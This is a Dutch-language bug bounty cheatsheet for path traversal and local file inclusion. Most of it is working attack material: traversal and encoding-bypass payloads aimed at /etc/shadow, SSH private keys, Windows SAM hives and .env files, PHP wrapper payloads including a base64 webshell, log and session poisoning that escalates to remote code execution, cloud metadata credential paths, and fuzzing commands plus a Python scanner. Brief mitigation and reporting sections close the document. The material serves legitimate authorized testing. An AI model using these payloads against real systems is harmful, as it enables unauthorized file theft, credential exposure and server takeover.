
# Path/Directory Traversal - Bug Bounty Cheatsheet

## Basis Concepten

### Wat is Directory Traversal?

Exploit dat toegang geeft tot bestanden en directories buiten de intended root directory door manipulatie van file paths met `../` sequences.

### Impact

- Lezen van sensitive files (passwords, configs, source code)
- RCE via log poisoning
- Information disclosure
- Authentication bypass

## Basis Payloads

### Linux/Unix Traversal

bash

```bash
# Basis traversal
../
../../
../../../
../../../../
../../../../../

# Common targets
../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../etc/group
../../../root/.ssh/id_rsa
../../../root/.bash_history
../../../home/user/.ssh/id_rsa

# Application files
../../../var/www/html/config.php
../../../var/www/html/.env
../../../var/log/apache2/access.log
../../../var/log/nginx/access.log
../../../proc/self/environ
../../../proc/self/cmdline
```

### Windows Traversal

bash

```bash
# Basis traversal
..\
..\..\
..\..\..\
..\..\..\..\

# Common targets
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\system.ini
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini
..\..\..\..\windows\system32\config\sam
..\..\..\..\windows\system32\config\system

# Application files
..\..\..\..\inetpub\wwwroot\web.config
..\..\..\..\xampp\htdocs\config.php
..\..\..\..\Program Files\application\config.ini
```

## Encoding Bypass Techniques

### URL Encoding

bash

```bash
# Single encoding
..%2f..%2f..%2fetc%2fpasswd
..%5c..%5c..%5cwindows%5cwin.ini

# Double encoding
..%252f..%252f..%252fetc%252fpasswd
..%255c..%255c..%255cwindows%255cwin.ini

# Mixed encoding
..%2f..%5c..%2fetc/passwd
```

### Unicode/UTF-8 Encoding

bash

```bash
# Unicode dots
%u002e%u002e%u002f
%u002e%u002e%u005c

# UTF-8 encoding
..%c0%af
..%c1%9c
..%e0%80%af

# Overlong UTF-8
..%c0%2f
..%c0%5c
```

### 16-bit Unicode

bash

```bash
# 16-bit encoding
%u002e%u002e%u2215
%u002e%u002e%u2216

# Alternative representations
..%uff0f
..%uff3c
```

## Filter Bypass Techniques

### Null Byte Injection

bash

```bash
# Null byte bypass (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd\x00
../../../etc/passwd\0

# Werkt als extension gefilterd wordt
image.jpg%00../../../etc/passwd
```

### Nested Traversal

bash

```bash
# Als ../ gefilterd wordt
....//....//....//etc/passwd
..././..././..././etc/passwd
....\....\....\windows\win.ini

# Dubbele encoding in nested
....%2f....%2f....%2fetc%2fpasswd
```

### Absolute Path

bash

```bash
# Als relatieve paths geblokkeerd zijn
/etc/passwd
/var/www/html/config.php
C:\windows\win.ini
C:\inetpub\wwwroot\web.config

# Met URL encoding
%2fetc%2fpasswd
%2fvar%2fwww%2fhtml%2fconfig.php
```

### Dot Variations

bash

```bash
# Extra dots
...//...//.../etc/passwd
.../.../etc/passwd

# Reverse slash
..\/..\/..\etc/passwd
..\/..\/..\/etc/passwd

# Forward+backward slash mix
..\/..\/..\/windows/win.ini
../../..\windows\system32\drivers\etc\hosts
```

### Case Manipulation (Windows)

bash

```bash
# Windows is case-insensitive
..\Windows\System32\config\sam
..\WINDOWS\system32\CONFIG\sam
..\WiNdOwS\SyStEm32\CoNfIg\sam
```

### Special Characters

bash

```bash
# Backslash alternatives
..%5cetc%5cpasswd
..%255cetc%255cpasswd

# Forward slash alternatives
..%2fetc%2fpasswd
..%c0%afetc%c0%afpasswd

# Questions marks (sometimes ignored)
..?/..?/..?/etc/passwd

# Semicolons
..;/..;/..;/etc/passwd
```

## Context-Specific Payloads

### File Parameter

bash

```bash
# GET parameter
?file=../../../etc/passwd
?filename=../../../etc/passwd
?path=../../../etc/passwd
?document=../../../etc/passwd
?page=../../../etc/passwd
?template=../../../etc/passwd

# POST parameter
file=../../../etc/passwd
path=../../../windows/win.ini
```

### Include/Require (PHP)

php

```php
# LFI via include
?page=../../../etc/passwd
?inc=../../../var/log/apache2/access.log
?module=../../../proc/self/environ

# PHP wrappers
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://input (+ POST data met PHP code)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
?page=expect://whoami
?page=zip://archive.zip%23shell.php
```

### Image/File Upload

bash

```bash
# Filename manipulation
../../../var/www/html/shell.php
../../uploads/../../../var/www/html/shell.php

# Content-Disposition
Content-Disposition: form-data; name="file"; filename="../../../shell.php"

# Path in metadata
exif_data: "../../../public/images/shell.php"
```

### API Endpoints

bash

````bash
# REST API
GET /api/files?path=../../../etc/passwd
POST /api/download {"file":"../../../etc/passwd"}
GET /api/v1/document/download?id=../../../etc/passwd

# GraphQL
query {
  readFile(path: "../../../etc/passwd")
}
```

## BurpSuite Workflows

### 1. Active Scanning
```
1. Send request to Scanner
2. Scan Configuration:
   - Enable "Path traversal" checks
   - Use "Thorough" scan
3. Review Issues tab
4. Manually verify findings
```

### 2. Intruder Attack
```
Position markers:
GET /download?file=§PAYLOAD§

Payload List 1 (Depth):
../
../../
../../../
../../../../
../../../../../
../../../../../../

Payload List 2 (Files):
etc/passwd
etc/shadow
var/log/apache2/access.log
windows/win.ini
boot.ini

Attack Type: Cluster Bomb
```

### 3. Repeater Testing
```
1. Send to Repeater (Ctrl+R)
2. Modify file parameter
3. Test various encodings:
   - URL encode
   - Double URL encode
   - Unicode encode
4. Check response for file content
5. Analyze Content-Type header
```

### 4. Match & Replace voor Encoding
```
Proxy → Options → Match and Replace

Add encoding rules:
Type: Request parameter value
Match: \.\./
Replace: ..%2f

Type: Request parameter value
Match: \\
Replace: %5c
```

### 5. Grep Extract Settings
```
Intruder → Options → Grep - Extract

Extract interessante strings:
- root:x:0:0:
- [extensions]
- DB_PASSWORD
- <?php
- <!-- 
- private key
````

## Advanced Techniques

### Log Poisoning naar RCE

bash

```bash
# Step 1: Poison access log
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

# Step 2: Include poisoned log
GET /download?file=../../../var/log/apache2/access.log&cmd=whoami

# Alternative logs
/var/log/nginx/access.log
/var/log/apache2/error.log
/var/log/vsftpd.log
/var/log/mail.log
/proc/self/environ
```

### /proc Filesystem (Linux)

bash

```bash
# Self process info
/proc/self/cmdline
/proc/self/environ
/proc/self/cwd/
/proc/self/exe
/proc/self/fd/0-10

# Other processes
/proc/1/cmdline
/proc/1234/environ
/proc/[pid]/maps

# System info
/proc/version
/proc/cpuinfo
/proc/meminfo
/proc/net/tcp
/proc/net/fib_trie
```

### Session File Inclusion

bash

```bash
# PHP session files
/var/lib/php/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]

# Step 1: Inject payload in session
?name=<?php system($_GET['cmd']); ?>

# Step 2: Include session file
?page=../../../tmp/sess_[YOUR_SESSID]&cmd=whoami
```

### Alternate Data Streams (Windows)

bash

```bash
# NTFS ADS
file.txt::$DATA
file.txt:hidden.txt:$DATA
C:\windows\system32\drivers\etc\hosts::$DATA

# Read ADS
?file=config.php::$DATA
?file=web.config:backup:$DATA
```

### Filter Chains (PHP)

php

```php
# Base64 encode output
php://filter/convert.base64-encode/resource=config.php

# ROT13 encoding
php://filter/string.rot13/resource=config.php

# Chain multiple filters
php://filter/convert.base64-encode/convert.base64-decode/resource=config.php

# Strip tags
php://filter/string.strip_tags/resource=config.php
```

## Platform-Specific Files

### Linux Sensitive Files

bash

```bash
# Authentication
/etc/passwd
/etc/shadow
/etc/sudoers
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa

# Configuration
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/etc/php/7.4/apache2/php.ini
/etc/postgresql/*/main/pg_hba.conf

# Application configs
/var/www/html/.env
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/configuration.php (Joomla)
/var/www/html/sites/default/settings.php (Drupal)

# Logs
/var/log/apache2/access.log
/var/log/nginx/error.log
/var/log/mysql/error.log
/var/log/auth.log
/var/log/syslog

# History
/root/.bash_history
/root/.mysql_history
/home/user/.bash_history
```

### Windows Sensitive Files

bash

```bash
# System files
C:\windows\system32\config\sam
C:\windows\system32\config\system
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
C:\windows\win.ini
C:\windows\system.ini

# Web server configs
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
C:\wamp\www\config.php
C:\Program Files\Apache Group\Apache2\conf\httpd.conf

# Application files
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Users\Administrator\AppData\Roaming\FileZilla\recentservers.xml

# Database
C:\Program Files\MySQL\my.ini
C:\xampp\mysql\bin\my.ini
```

### Cloud Metadata Endpoints

bash

```bash
# AWS
/latest/meta-data/
/latest/meta-data/iam/security-credentials/
/latest/user-data/

# Azure
/metadata/instance?api-version=2021-02-01
/metadata/identity/oauth2/token

# Google Cloud
/computeMetadata/v1/
/computeMetadata/v1/instance/service-accounts/default/token

# Access via traversal
?file=http://169.254.169.254/latest/meta-data/
```

## Testing Checklist

- [ ]  Test alle file/path parameters
- [ ]  Test GET parameters
- [ ]  Test POST parameters
- [ ]  Test JSON body parameters
- [ ]  Test HTTP headers (X-Filename, etc.)
- [ ]  Test file upload filenames
- [ ]  Test Cookie values
- [ ]  Test API endpoints
- [ ]  Probeer verschillende depths (1-10 levels)
- [ ]  Test beide slash types (/ en )
- [ ]  Test encoding bypasses
- [ ]  Test null byte injection
- [ ]  Test absolute paths
- [ ]  Test URL encoding
- [ ]  Test double encoding
- [ ]  Test unicode encoding
- [ ]  Test nested traversal
- [ ]  Test case manipulation (Windows)
- [ ]  Test PHP wrappers (als PHP)
- [ ]  Test log poisoning
- [ ]  Test /proc filesystem
- [ ]  Check voor RCE mogelijkheden

## Automation Tools

### FFuf voor Directory Traversal

bash

```bash
# Basis fuzzing
ffuf -u "https://target.com/download?file=FUZZ" \
     -w traversal-wordlist.txt \
     -mc 200

# Met depth variaties
for i in {1..10}; do
  prefix=$(printf '../%.0s' $(seq 1 $i))
  echo "${prefix}etc/passwd" >> wordlist.txt
done

ffuf -u "https://target.com/file?path=FUZZ" -w wordlist.txt
```

### DotDotPwn

bash

```bash
# Automated traversal scanner
dotdotpwn -m http \
          -h target.com \
          -x 80 \
          -f /etc/passwd \
          -k "root:" \
          -d 5

# HTTP-specific options
dotdotpwn -m http \
          -h target.com \
          -O \
          -X \
          -M GET \
          -o unix
```

### Custom Python Script

python

````python
import requests

url = "https://target.com/download"
target_file = "etc/passwd"
indicator = "root:"

# Generate payloads
for depth in range(1, 11):
    traversal = "../" * depth
    payload = traversal + target_file
    
    # Test different encodings
    payloads = [
        payload,
        payload.replace("/", "%2f"),
        payload.replace("/", "%252f"),
        payload.replace(".", "%2e"),
        "....//....//....//etc/passwd",
    ]
    
    for p in payloads:
        params = {"file": p}
        response = requests.get(url, params=params)
        
        if indicator in response.text:
            print(f"[+] Found: {p}")
            print(response.text[:200])
```

### Burp Extension: LFI Scanner
```
Extensions → BApp Store:
- "LFI Scanner Checks"
- "Collaborator Everywhere"
- "Param Miner" (voor hidden parameters)
````

## Commands & Testing

### cURL Testing

bash

```bash
# Basis test
curl "https://target.com/download?file=../../../etc/passwd"

# Met URL encoding
curl "https://target.com/download?file=..%2f..%2f..%2fetc%2fpasswd"

# Follow redirects
curl -L "https://target.com/file?path=../../../etc/passwd"

# Show headers
curl -i "https://target.com/download?file=../../../etc/passwd"

# POST request
curl -X POST "https://target.com/api/file" \
     -d '{"path":"../../../etc/passwd"}' \
     -H "Content-Type: application/json"
```

### Testing met Wfuzz

bash

```bash
# Fuzzing met wordlist
wfuzz -c -z file,lfi-wordlist.txt \
      "https://target.com/download?file=FUZZ"

# Filter op response size
wfuzz -c -z file,lfi-wordlist.txt \
      --hh 0 \
      "https://target.com/download?file=FUZZ"

# Filter op regex
wfuzz -c -z file,lfi-wordlist.txt \
      --ss "root:" \
      "https://target.com/download?file=FUZZ"
```

## Validation & Verification

### Indicators of Success

bash

````bash
# Linux - /etc/passwd
root:x:0:0:root:/root:/bin/bash

# Windows - win.ini
[fonts]
[extensions]
[files]

# PHP config
<?php
define('DB_PASSWORD', 'secret');

# .env file
DB_PASSWORD=secret123
API_KEY=abc123

# SSH private key
-----BEGIN RSA PRIVATE KEY-----
```

### False Positives
```
- Error messages die path tonen
- Default "file not found" pages
- Empty responses (200 OK maar geen content)
- Incorrect mime-types
```

## Mitigation Verification

### Goed geïmplementeerde defenses
```
1. Whitelist van toegestane files
2. Resolving absolute paths
3. Chroot jail
4. Proper input validation
5. No directory listing
6. Least privilege principle
````

### Test of mitigatie effectief is

bash

```bash
# Als geblacklist
?file=../etc/passwd → Blocked
?file=....//etc/passwd → Should be blocked
?file=..%2fetc%2fpasswd → Should be blocked

# Test whitelist bypass
?file=allowed.pdf → Allowed
?file=allowed.pdf%00../../../etc/passwd → Should block
```

## Reporting Template

markdown

````markdown
## Vulnerability: Path Traversal / Local File Inclusion

**Severity:** High/Critical

**Endpoint:** /download

**Parameter:** file

**Description:**
De applicatie valideert de `file` parameter niet adequaat, waardoor een attacker arbitrary files kan lezen via directory traversal.

**Steps to Reproduce:**
1. Navigate naar: https://target.com/download
2. Inject payload: ?file=../../../etc/passwd
3. Response bevat inhoud van /etc/passwd

**Payload:**
```
GET /download?file=../../../etc/passwd HTTP/1.1
Host: target.com
```

**Response:**
```
HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Impact:**
- Lezen van sensitive system files
- Access tot database credentials
- Source code disclosure
- Mogelijk RCE via log poisoning

**Remediation:**
- Implement file whitelist
- Use basename() op user input
- Validate against absolute path
- Use chroot jail
- Disable directory traversal in web server config
- Never pass user input directly to file operations
````

## Common Wordlists

bash

```bash
# SecLists
/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
/opt/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt

# Custom wordlist generator
#!/bin/bash
for i in {1..15}; do
    prefix=$(printf '../%.0s' $(seq 1 $i))
    echo "${prefix}etc/passwd"
    echo "${prefix}etc/shadow"
    echo "${prefix}var/www/html/config.php"
    echo "${prefix}windows/win.ini"
done > traversal-wordlist.txt
```